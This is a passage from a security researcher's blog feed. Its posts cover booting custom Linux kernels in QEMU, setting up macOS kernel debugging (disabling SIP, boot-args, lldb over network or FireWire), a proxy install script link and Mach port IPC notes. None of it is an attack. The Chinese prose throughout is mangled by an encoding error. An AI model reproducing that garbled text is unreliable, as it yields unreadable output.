10g</span><br><span class="line">mkfs.ext2 <span class="variable">$IMG</span></span><br><span class="line">mkdir <span class="variable">$DIR</span></span><br><span class="line">sudo mount -o loop <span class="variable">$IMG</span> <span class="variable">$DIR</span></span><br><span class="line">sudo debootstrap --arch amd64 jessie <span class="variable">$DIR</span></span><br><span class="line">sudo umount <span class="variable">$DIR</span></span><br><span class="line">rmdir <span class="variable">$DIR</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·ç›´æ¥åˆ›å»ºä¸è¡Œï¼Œéœ€è¦åœ¨å–æ¶ˆæŒ‚è½½ä¹‹å‰è®¾ç½®å¥½æ–°æ–‡ä»¶ç³»ç»Ÿé‡Œçš„ç”¨æˆ·åå¯†ç ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot mount-point.dir /bin/bash</span><br></pre></td></tr></table></figure><p>è¿›å»ä¹‹åï¼Œç›´æ¥ä¿®æ”¹rootå¯†ç å°±è¡Œäº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># passwd root</span></span><br></pre></td></tr></table></figure><p>å…¶å®è¿˜èƒ½åšå…¶ä»–çš„è®¾ç½®ï¼Œä½†æ˜¯åªæ˜¯ä¸ºäº†éªŒè¯åŠ è½½çš„å†…æ ¸æ˜¯å¦æ­£å¸¸ï¼Œåªéœ€è¦ç™»å½•è¿›å»å°±okäº†ã€‚</p><p>åŸºæœ¬ä¸Šéƒ½èƒ½ç”¨è¿™ä¸ªå‘½ä»¤èµ·æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-x86_64 \</span><br><span class="line">-enable-kvm \</span><br><span class="line">-m 2G -smp 2 \</span><br><span class="line">-hda qemu-image.img  \</span><br><span class="line">-kernel linux-5.4-rc4/arch/x86/boot/bzImage \</span><br><span class="line">-append <span class="string">&quot;debug root=/dev/sda  console=ttyS0&quot;</span> \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure><p>é™¤äº†ktsan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -drive file=qemu-image.img,index=0 \</span><br><span class="line">  -m 24G -smp 4 \</span><br><span class="line">  -net user,hostfwd=tcp::10022-:22 -net nic \</span><br><span class="line">  -nographic \</span><br><span class="line">  -kernel arch/x86/boot/bzImage -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw debug earlyprintk=serial slub_debug=QUZ&quot;</span>\</span><br><span class="line">  -enable-kvm -cpu host</span><br></pre></td></tr></table></figure><p>æˆ‘ç”¨å®ƒwikié‡Œçš„å‘½ä»¤æ— æ³•æˆåŠŸå¯åŠ¨ï¼Œå„ç§panicï¼Œæˆ–è€…å°±æ˜¯æ–‡ä»¶ç³»ç»ŸæŒ‚è½½å‡ºé—®é¢˜ï¼Œæˆ‘æ¢äº†æˆ‘åŸæœ¬çš„ext2çš„imgä¹‹åå¤šè¯•å‡ æ¬¡ï¼Œå°±èƒ½æ­£å¸¸å·¥ä½œäº†ã€‚</p><p>æˆ‘è¿™é‡Œç»™çš„æ˜¯<code>24G</code>å†…å­˜ã€‚</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://github.com/google/ktsan/wiki">ktsan</a><br><a href="https://github.com/google/kmsan">kmsan</a><br><a href="https://www.kernel.org/">linux-kernel</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;env-config&quot;&gt;&lt;a href=&quot;#env-config&quot; class=&quot;headerlink&quot; title=&quot;env config&quot;&gt;&lt;/a&gt;env config&lt;/h2&gt;&lt;p&gt;&lt;code&gt;ubuntu 18.04 amd64&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ç¯å¢ƒé…ç½®è¸©å‘" scheme="http://o0xmuhe.me/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/"/>
    
    
    <category term="Linux" scheme="http://o0xmuhe.me/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Debug macOS Kernel</title>
    <link href="http://o0xmuhe.me/2019/10/17/Debug-macOS-Kernel/"/>
    <id>http://o0xmuhe.me/2019/10/17/Debug-macOS-Kernel/</id>
    <published>2019-10-17T08:30:05.000Z</published>
    <updated>2020-06-20T11:04:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç¯å¢ƒé…ç½®"><a href="#0x00-ç¯å¢ƒé…ç½®" class="headerlink" title="0x00 : ç¯å¢ƒé…ç½®"></a>0x00 : ç¯å¢ƒé…ç½®</h2><p>åŸºæœ¬åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼Œè™šæ‹Ÿæœºè°ƒè¯•æˆ–è€…åŒæœºè°ƒè¯•ã€‚</p><p>è™šæ‹Ÿæœº ï¼š <code>vmfusion</code>,`` KDK`</p><p>åŒæœº: ç«çº¿ã€‚ æˆ‘è¿™é‡Œç”¨çš„æ˜¯``mbp2017<code>è°ƒ</code>mbp2015<code>ï¼Œå€Ÿäº†åŒäº‹çš„çº¿ï¼Œè¿æ¥ä¸ºï¼š</code>mbp2017-typec-é›·ç”µ2-ç«çº¿-é›·ç”µ2-mbp2015`ã€‚</p><a id="more"></a><h2 id="0x01-è™šæ‹Ÿæœº"><a href="#0x01-è™šæ‹Ÿæœº" class="headerlink" title="0x01 : è™šæ‹Ÿæœº"></a>0x01 : è™šæ‹Ÿæœº</h2><p>ä¸‹é¢æ˜¯æ ‡å‡†æ­¥éª¤</p><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><ol start="0"><li><p>å…³é—­SIPï¼Œå¹¶ä¸”æŠŠæƒ³è¦åŠ è½½çš„å†…æ ¸æ‹·è´åˆ° å†…æ ¸çš„ç›®å½•</p><p><code>sudo cp /Library/Developer/KDKs/KDK_YOUR_VERSION/System/Library/Kernels/kernel.development /System/Library/Kernels</code></p></li><li><p>å®‰è£…å½“å‰ç‰ˆæœ¬ç³»ç»Ÿçš„KDKï¼Œ[Apple Develop KDK download](<a href="https://developer.apple.com/download/more/?q=Kernel">https://developer.apple.com/download/more/?q=Kernel</a> Debug Kit)</p></li><li><p>è®¾ç½®å¯åŠ¨å‚æ•°</p><p><code> sudo nvram boot-args=&quot;debug=0x14e kext-dev-mode=1 kcsuffix=development pmuflags=1 -v&quot;</code></p></li><li><p>æ¸…ç†ç¼“å­˜</p><p><code> sudo kextcache -invalidate /</code></p></li><li><p>è®°ä½å½“å‰vmçš„ipï¼Œç„¶åé‡å¯</p><p><code>sudo reboot</code></p></li></ol><p>è¿™é‡ŒæŠŠ<code>development</code>ç‰ˆæœ¬çš„å†…æ ¸æ‹·è´åˆ°<code>System/Library/Kernels</code>é‡Œï¼ŒæŒ‡å®šå¯åŠ¨æ—¶åŠ è½½<code>development</code>ç‰ˆæœ¬çš„å†…æ ¸ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åŠ è½½<code>kasan</code>ç‰ˆæœ¬çš„ï¼Œçœ‹éœ€æ±‚ã€‚</p><h3 id="host"><a href="#host" class="headerlink" title="host"></a>host</h3><ol start="0"><li>å®‰è£…è¢«è°ƒè¯•æœºå™¨çš„KDK</li></ol><p>è¿™ç§æƒ…å†µæ˜¯é ç½‘ç»œè°ƒè¯•ã€‚</p><p>ä½†æ˜¯æ ¹æ®ä¹‹å‰çš„å¯åŠ¨å‚æ•°ï¼Œå¼€æœºæ—¶æ–­ä¸ä¸‹æ¥çš„ï¼Œå½“ç„¶å¯ä»¥è®¾ç½®ä¸€ä¸ª0x1æ¥è®©ä»–å¯åŠ¨æ—¶æ–­ä¸‹æ¥ç­‰è°ƒè¯•å™¨ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•ï¼Œè¿™ä¸ªä¸å¥½ä½¿(å¯èƒ½æˆ‘ç¯å¢ƒæœ‰é—®é¢˜)ã€‚</p><p>å¦‚æœæŒ‰ç…§ä¸Šé¢çš„è®¾ç½®<code>0x14e</code> ï¼Œé‚£ä¹ˆéœ€è¦åœ¨è™šæ‹Ÿæœºä¸­æŒ‰ä¸‹ <code>cmd + opt + ctrl + shitf+ esc</code>è§¦å‘ä¸­æ–­ï¼Œ</p><p>éšålldbä¸­ : </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ lldb /Library/Developer/KDKs/KDK_10.13.4_17E199.kdk/System/Library/Kernels/kernel.development</span><br><span class="line">(lldb)kdp-remote you_vm_ip</span><br></pre></td></tr></table></figure><p>ä¹‹åå°±å¯ä»¥è°ƒè¯•äº†ã€‚</p><h2 id="0x02-åŒæœºè°ƒè¯•"><a href="#0x02-åŒæœºè°ƒè¯•" class="headerlink" title="0x02 : åŒæœºè°ƒè¯•"></a>0x02 : åŒæœºè°ƒè¯•</h2><p>ä¸‹é¢æ˜¯æ ‡å‡†æ­¥éª¤</p><h3 id="è¢«è°ƒè¯•æœº"><a href="#è¢«è°ƒè¯•æœº" class="headerlink" title="è¢«è°ƒè¯•æœº"></a>è¢«è°ƒè¯•æœº</h3><ol start="0"><li><p>å…³SIPï¼Œæ‹·è´KDKé‡Œçš„å†…æ ¸åˆ°<code>/System/Library/Kernels</code></p></li><li><p>å®‰è£…å½“å‰ç³»ç»Ÿç‰ˆæœ¬çš„KDK</p></li><li><p>è®¾ç½®å¯åŠ¨å‚æ•°</p><p><code>sudo nvram boot-args=&quot;debug=0x14e kdp_match_name=firewire fwkdp=0x8000 kcsuffix=development&quot;</code></p></li><li><p>æ¸…ç†ç¼“å­˜</p><p><code> sudo kextcache -invalidate /</code></p></li><li><p>é‡å¯</p><p><code>sudo reboot</code></p></li></ol><p>è¿™é‡Œå¿…é¡»è¯´ä¸€ä¸‹ï¼Œç«çº¿çš„åç§°ï¼Œ<code>ifconfig</code>é‡Œçœ‹åˆ°çš„ï¼Œé»˜è®¤æ˜¯<code>fw0</code>ï¼Œä½†æ˜¯è¿™ä¸ªå¯åŠ¨å‚æ•°é‡Œå¿…é¡»æ˜¯<code>firewire</code>ï¼Œ</p><p>å¿…é¡»æ˜¯<code>firewire</code>ï¼Œå¿…é¡»æ˜¯<code>firewire</code>ï¼</p><p>è¿™ä¸ªåœ°æ–¹å‘äº†æˆ‘æŒºä¹…ï¼Œæˆ‘ä¸€ç›´ä»¥ä¸ºç”¨<code>ifconfig</code>é‡Œçœ‹åˆ°çš„é‚£ä¸ªåå­—  :-(</p><h3 id="è°ƒè¯•æœº"><a href="#è°ƒè¯•æœº" class="headerlink" title="è°ƒè¯•æœº"></a>è°ƒè¯•æœº</h3><ol start="0"><li><p>å®‰è£…è¢«è°ƒè¯•æœºå™¨çš„KDK</p></li><li><p>LLDBåŠ è½½ç›®æ ‡å†…æ ¸</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ lldb /Library/Developer/KDKs/KDK_10.13.4_17E199.kdk/System/Library/Kernels/kernel.development</span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure></li><li><p>å¯åŠ¨fwkdp</p><p><code>fwkdp -v</code></p></li><li><p>è¢«è°ƒè¯•æœºæŒ‰ä¸‹<code>cmd+opt+ctrl+shift+esc</code>è§¦å‘ä¸­æ–­</p></li><li><p>lldb é‡Œè¿æ¥</p><p><code>(lldb) kdp-remote localhost</code></p></li></ol><p>æ„Ÿè§‰è¿‡ç¨‹å°±æ˜¯<code>fwkdp</code>åšäº†è½¬å‘çš„å·¥ä½œï¼Œæ‰€ä»¥lldbç›´æ¥<code>kdp-remote</code>å°±å¯ä»¥äº†ã€‚</p><h2 id="0x03-KDKæ˜¯å¿…é¡»çš„å—ï¼Ÿ"><a href="#0x03-KDKæ˜¯å¿…é¡»çš„å—ï¼Ÿ" class="headerlink" title="0x03 : KDKæ˜¯å¿…é¡»çš„å—ï¼Ÿ"></a>0x03 : KDKæ˜¯å¿…é¡»çš„å—ï¼Ÿ</h2><p>å¹¶ä¸æ˜¯ï¼Œkdkåªæ˜¯ç»™ä½ æ›´å¤šçš„å†…æ ¸ä¸­çš„ç¬¦å·ï¼Œæ‰€ä»¥ä¸ç”¨kdkä¹Ÿæ²¡äº‹ï¼Œå°±ç­‰äºç›´æ¥è°ƒè¯•æ­£å¼ç‰ˆçš„å†…æ ¸ï¼Œå°‘äº†å†…æ ¸ç¬¦å·è€Œå·²ï¼Œäººè‚‰å¯¹æ¯”ç€è¿‘æœŸç‰ˆæœ¬çš„æºç å…¶å®å½±å“æ²¡é‚£ä¹ˆå¤§ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç¯å¢ƒé…ç½®&quot;&gt;&lt;a href=&quot;#0x00-ç¯å¢ƒé…ç½®&quot; class=&quot;headerlink&quot; title=&quot;0x00 : ç¯å¢ƒé…ç½®&quot;&gt;&lt;/a&gt;0x00 : ç¯å¢ƒé…ç½®&lt;/h2&gt;&lt;p&gt;åŸºæœ¬åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼Œè™šæ‹Ÿæœºè°ƒè¯•æˆ–è€…åŒæœºè°ƒè¯•ã€‚&lt;/p&gt;
&lt;p&gt;è™šæ‹Ÿæœº ï¼š &lt;code&gt;vmfusion&lt;/code&gt;,`` KDK`&lt;/p&gt;
&lt;p&gt;åŒæœº: ç«çº¿ã€‚ æˆ‘è¿™é‡Œç”¨çš„æ˜¯``mbp2017&lt;code&gt;è°ƒ&lt;/code&gt;mbp2015&lt;code&gt;ï¼Œå€Ÿäº†åŒäº‹çš„çº¿ï¼Œè¿æ¥ä¸ºï¼š&lt;/code&gt;mbp2017-typec-é›·ç”µ2-ç«çº¿-é›·ç”µ2-mbp2015`ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="é…ç½®ç¯å¢ƒè¸©å‘" scheme="http://o0xmuhe.me/categories/%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E8%B8%A9%E5%9D%91/"/>
    
    
    <category term="macOS" scheme="http://o0xmuhe.me/tags/macOS/"/>
    
  </entry>
  
  <entry>
    <title>Snell auto install cript</title>
    <link href="http://o0xmuhe.me/2019/09/26/Snell-auto-install-cript/"/>
    <id>http://o0xmuhe.me/2019/09/26/Snell-auto-install-cript/</id>
    <published>2019-09-26T08:57:01.000Z</published>
    <updated>2020-06-20T11:09:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-Snell"><a href="#0x00-Snell" class="headerlink" title="0x00 : Snell"></a>0x00 : Snell</h2><p>Snellæ˜¯Surgeæ”¯æŒçš„ä¸€ç§**åè®®ï¼Œä½†æ˜¯serverå¹¶ä¸å¼€æºï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰Surgeå®¢æˆ·ç«¯æ‰èƒ½ç”¨ã€‚</p><a id="more"></a><p>ç¢ç£¨äº†ä¸‹å†™äº†ä¸ªè‡ªåŠ¨åŒ–çš„é…ç½®è„šæœ¬ã€‚</p><h2 id="0x01-Script"><a href="#0x01-Script" class="headerlink" title="0x01 : Script"></a>0x01 : Script</h2><p><a href="https://gist.github.com/o0xmuhe/c8d548037f42e651595af79408e299a2">snel.sh</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-Snell&quot;&gt;&lt;a href=&quot;#0x00-Snell&quot; class=&quot;headerlink&quot; title=&quot;0x00 : Snell&quot;&gt;&lt;/a&gt;0x00 : Snell&lt;/h2&gt;&lt;p&gt;Snellæ˜¯Surgeæ”¯æŒçš„ä¸€ç§**åè®®ï¼Œä½†æ˜¯serverå¹¶ä¸å¼€æºï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰Surgeå®¢æˆ·ç«¯æ‰èƒ½ç”¨ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="å·¥å…·" scheme="http://o0xmuhe.me/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="Snell" scheme="http://o0xmuhe.me/tags/Snell/"/>
    
    <category term="Surge" scheme="http://o0xmuhe.me/tags/Surge/"/>
    
  </entry>
  
  <entry>
    <title>macOS IPC Study Notes</title>
    <link href="http://o0xmuhe.me/2019/09/20/macOS-IPC-Study-basic-2/"/>
    <id>http://o0xmuhe.me/2019/09/20/macOS-IPC-Study-basic-2/</id>
    <published>2019-09-20T09:43:44.000Z</published>
    <updated>2020-06-20T11:06:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-æ–¹å¼"><a href="#1-æ–¹å¼" class="headerlink" title="1. æ–¹å¼"></a>1. æ–¹å¼</h2><a id="more"></a><ul><li><p>MIG</p></li><li><p>XPC</p></li><li><p>DO</p><p>â€¦.</p></li></ul><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651523516510.jpg" alt="-w303"></p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651523730105.jpg" alt="-w843"></p><p>ç„¶è€Œä¸€åˆ‡éƒ½æ˜¯åœ¨Mach Msgçš„åŸºç¡€ä¹‹ä¸Šçš„ã€‚</p><h2 id="2-ä¸€äº›åŸºç¡€æ¦‚å¿µ"><a href="#2-ä¸€äº›åŸºç¡€æ¦‚å¿µ" class="headerlink" title="2. ä¸€äº›åŸºç¡€æ¦‚å¿µ"></a>2. ä¸€äº›åŸºç¡€æ¦‚å¿µ</h2><h3 id="2-1-ä»€ä¹ˆæ˜¯Port"><a href="#2-1-ä»€ä¹ˆæ˜¯Port" class="headerlink" title="2.1 ä»€ä¹ˆæ˜¯Port"></a>2.1 ä»€ä¹ˆæ˜¯Port</h3><p>ä¸ªäººç†è§£å°±æ˜¯ç±»ä¼¼Windowsä¸Šhandleçš„æ¦‚å¿µã€‚<br>ç”¨æˆ·æ€ç»è¿‡å¤„ç†æ˜¯ä¸€ä¸ªç±»ä¼¼socketçš„æ•´æ•°ï¼Œå†…æ ¸æ€(namep)ç´¢å¼•åˆ°ä¸ä¹‹å¯¹åº”çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼ŒIPCæ—¶é€šè¿‡Portä¼ é€’æ•°æ®åˆ°æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæˆ–è€…ä»æ¶ˆæ¯é˜Ÿåˆ—å–å‡ºæ•°æ®ã€‚</p><h4 id="2-2-2-port-name"><a href="#2-2-2-port-name" class="headerlink" title="2.2.2 port name"></a>2.2.2 port name</h4><h4 id="2-2-3-port-right"><a href="#2-2-3-port-right" class="headerlink" title="2.2.3 (port) right"></a>2.2.3 (port) right</h4><p>ä¸€ä¸ªportå’Œå¯¹è¿™ä¸ªportçš„è®¿é—®æƒé™ï¼Œæœ‰å¯¹åº”çš„æƒé™æ‰èƒ½åšå¯¹åº”çš„æ“ä½œï¼Œæ¯”å¦‚recvï¼Œæ¥æ”¶æ•°æ®ï¼›sendï¼Œå‘é€æ•°æ®ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#define MACH_PORT_RIGHT_SEND((mach_port_right_t) 0)</span><br><span class="line">#define MACH_PORT_RIGHT_RECEIVE((mach_port_right_t) 1)</span><br><span class="line">#define MACH_PORT_RIGHT_SEND_ONCE((mach_port_right_t) 2)</span><br><span class="line">#define MACH_PORT_RIGHT_PORT_SET((mach_port_right_t) 3)</span><br><span class="line">#define MACH_PORT_RIGHT_DEAD_NAME((mach_port_right_t) 4)</span><br><span class="line">#define MACH_PORT_RIGHT_LABELH        ((mach_port_right_t) 5)</span><br><span class="line">#define MACH_PORT_RIGHT_NUMBER((mach_port_right_t) 6)</span><br></pre></td></tr></table></figure><h3 id="2-2-åˆ›å»ºæµç¨‹"><a href="#2-2-åˆ›å»ºæµç¨‹" class="headerlink" title="2.2 åˆ›å»ºæµç¨‹"></a><a href="http://localhost:23333/source/xref/osfmk/ipc/mach_port.c">2.2 åˆ›å»ºæµç¨‹</a></h3><p>ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_port_t</span> p;</span><br><span class="line">mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;p);</span><br></pre></td></tr></table></figure><p><code>mach_port_allocate</code></p><p>å‡½æ•°å®šä¹‰å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_port_allocate(</span><br><span class="line"><span class="keyword">ipc_space_t</span>space,</span><br><span class="line"><span class="keyword">mach_port_right_t</span>right,</span><br><span class="line"><span class="keyword">mach_port_name_t</span>*namep)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">kern_return_t</span>kr;</span><br><span class="line"><span class="keyword">mach_port_qos_t</span>qos = qos_template;</span><br><span class="line"></span><br><span class="line">kr = mach_port_allocate_full (space, right, MACH_PORT_NULL,</span><br><span class="line">&amp;qos, namep);</span><br><span class="line"><span class="keyword">return</span> (kr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>mach_port_allocate_full</code><br>æ ¹æ®ä¸åŒçš„rightèµ°ä¸åŒçš„åˆ†é…é€»è¾‘ï¼š<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651518463591.jpg" alt="-w680"></p><p><code>ipc_port_alloc</code> /<code>ipc_port_alloc_name</code><br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651517357620.jpg" alt="-w614"></p><p>ä¸¤ä¸ªå‡½æ•°åŒºåˆ«åªæ˜¯æ˜¯å¦æŒ‡å®šäº†nameã€‚</p><p><code>ipc_object_alloc</code><br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651517526507.jpg" alt="-w596"></p><p>348è¡Œé€šè¿‡ä¸€ä¸ªå®ï¼ŒæŠŠportè½¬nameçš„æ–¹å¼è·å–namepï¼Œä¹‹åå¯¹ipc entryçš„å…³é”®ç»“æ„è¿›è¡Œåˆå§‹åŒ–ã€‚</p><p><code>ipc_port_init</code></p><p>åˆå§‹åŒ–<a href="http://localhost:23333/source/xref/osfmk/ipc/ipc_port.h#112">portç»“æ„</a></p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651518062479.jpg" alt="-w641"></p><p>è‡³æ­¤ï¼Œportåˆå§‹åŒ–å®Œæˆï¼Œnamepåˆå§‹åŒ–å®Œæˆï¼Œå¯ä»¥æ ¹æ®namepç´¢å¼•åˆ°å¯¹åº”çš„å†…æ ¸ä¸­çš„æ¶ˆæ¯é˜Ÿåˆ—ã€‚</p><p>portä¸ipc entryçš„å…³ç³»ï¼Œæ¥è‡ªMac OS X Internals:</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651519972092.jpg"></p><p><strong>å…¶ä¸­çš„ä¸€äº›æ¦‚å¿µï¼š</strong></p><ul><li>ç”¨æˆ·æ€ mach_port_t</li></ul><p>portåœ¨ç”¨æˆ·æ€è¡¨ç¤ºï¼Œç±»ä¼¼socketçš„ä¸€ä¸ªæ•´æ•°</p><ul><li><p>å†…æ ¸æ€ mach_port_name_t</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef natural_t mach_port_name_t;</span><br></pre></td></tr></table></figure><p>portåœ¨å†…æ ¸æ€è¡¨ç¤º</p></li><li><p>qos</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Structure used to pass information about port allocation requests.Must be padded to 64-bits total length.</span><br></pre></td></tr></table></figure></li><li><p>ipc space </p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Each task has a private IPC spacea namespace for portsthat is represented by the ipc_space structure in the kernel. </span><br><span class="line">Mac OS X Internals</span><br></pre></td></tr></table></figure><p>æ¯ä¸ªtaskéƒ½æœ‰è‡ªå·±çš„å”¯ä¸€ä¸€ä¸ªipc sapce,</p><p>å…¶ä¸­ <code>    ipc_entry_t is_table;        /* an array of entries */</code> å­—æ®µæ˜¯æ”¾ç€æ‰€æœ‰çš„ipc entryã€‚</p><p><a href="http://localhost:23333/source/xref/osfmk/kern/task.h">taskçš„ç»“æ„ä½“å®åœ¨æ˜¯å¤ªå¤§äº†</a>ï¼Œä»taskçš„<code>struct ipc_space *itk_space;</code>å­—æ®µç´¢å¼•åˆ°å…¶å¯¹åº”çš„ipc spaceã€‚</p><ul><li>ipc entry</li></ul><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15651508934037.jpg"></p><p>çœ‹æºç å‘ç°ï¼Œå›¾ä¸­çš„<code>ipc_tree_entry</code>ç»“æ„æ²¡äº†:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_space</span> &#123;</span></span><br><span class="line"><span class="keyword">lck_spin_t</span>is_lock_data;</span><br><span class="line"><span class="keyword">ipc_space_refs_t</span> is_bits;<span class="comment">/* holds refs, active, growing */</span></span><br><span class="line"><span class="keyword">ipc_entry_num_t</span> is_table_size;<span class="comment">/* current size of table */</span></span><br><span class="line"><span class="keyword">ipc_entry_num_t</span> is_table_free;<span class="comment">/* count of free elements */</span></span><br><span class="line"><span class="keyword">ipc_entry_t</span> is_table;<span class="comment">/* an array of entries */</span></span><br><span class="line"><span class="keyword">task_t</span> is_task;                 <span class="comment">/* associated task */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_table_size</span> *<span class="title">is_table_next</span>;</span> <span class="comment">/* info for larger table */</span></span><br><span class="line"><span class="keyword">ipc_entry_num_t</span> is_low_mod;<span class="comment">/* lowest modified entry during growth */</span></span><br><span class="line"><span class="keyword">ipc_entry_num_t</span> is_high_mod;<span class="comment">/* highest modified entry during growth */</span></span><br><span class="line"><span class="keyword">int</span> is_node_id;<span class="comment">/* HOST_LOCAL_NODE, or remote node if proxy space */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li> portçš„user referenceè®¡æ•°æ˜¯å•¥<br>ä¸€ä¸ªportçš„user referenceåªè¡¨ç¤ºäº†æŸä¸ªentryåœ¨taskçš„spaceä¸­è¢«å¤šå°‘ä¸ªåœ°æ–¹ä½¿ç”¨ï¼Œå’Œentryå®é™…æŒ‡å‘å“ªä¸ªportæ²¡æœ‰å…³ç³»</li></ul><h3 id="2-3-å‘é€MACH-MSG"><a href="#2-3-å‘é€MACH-MSG" class="headerlink" title="2.3 å‘é€MACH MSG"></a>2.3 å‘é€MACH MSG</h3><p>mach msgçš„ç»“æ„ä¸å†èµ˜è¿°ï¼Œè¿™éƒ¨åˆ†ç›´æ¥çœ‹<code>message.h</code>å¤´æ–‡ä»¶é‡Œçš„å®šä¹‰å³å¯ï¼Œä¸‹é¢ç€é‡çœ‹å‘é€å’Œæ¥æ”¶è¿‡ç¨‹ã€‚</p><p><strong>å…¶å®æ˜¯ä¸€ä¸ªæŠŠmach msgè½¬æ¢æˆkmsgç»“æ„ï¼Œç„¶åå…¥é˜Ÿ(ç›®æ ‡æ¶ˆæ¯é˜Ÿåˆ—)çš„æ“ä½œï¼Œç›®æ ‡è¿›ç¨‹è·å–å°±æ˜¯ä¸€ä¸ªå‡ºé˜Ÿçš„æ“ä½œã€‚</strong></p><p><code>ç”¨æˆ·æ€(client) &lt;--&gt; å†…æ ¸æ€ &lt;--&gt; ç”¨æˆ·æ€(server)</code></p><p>æ”¶/å‘éƒ½æ˜¯ç”¨<code>mach_msg</code>ï¼Œä½¿ç”¨optionså‚æ•°åŒºåˆ«æ˜¯æ”¶è¿˜æ˜¯å‘ã€‚</p><h4 id="2-3-1-æµç¨‹"><a href="#2-3-1-æµç¨‹" class="headerlink" title="2.3.1 æµç¨‹"></a>2.3.1 æµç¨‹</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 